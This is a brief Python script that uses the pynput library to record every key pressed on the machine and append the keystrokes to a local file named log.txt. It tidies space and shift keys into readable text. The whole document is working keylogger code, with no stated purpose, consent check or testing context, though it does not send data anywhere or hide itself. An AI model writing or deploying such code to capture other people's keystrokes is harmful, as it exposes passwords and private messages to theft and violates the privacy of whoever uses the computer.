from pynput.keyboard import Listener

def writeToFile(key):
    keydata = str(key)
    keydata = keydata.replace("'", '')

    #clean up modifier key logs
    if keydata == "Key.space":
        keydata = ' '
    if keydata == "Key.shift":
        keydata = ''


    #create a log file to store key strokes 
    with open("log.txt", 'a') as file:
        file.write(keydata)

#listen for key press and write to file 
with Listener(on_press=writeToFile) as l: 
    l.join()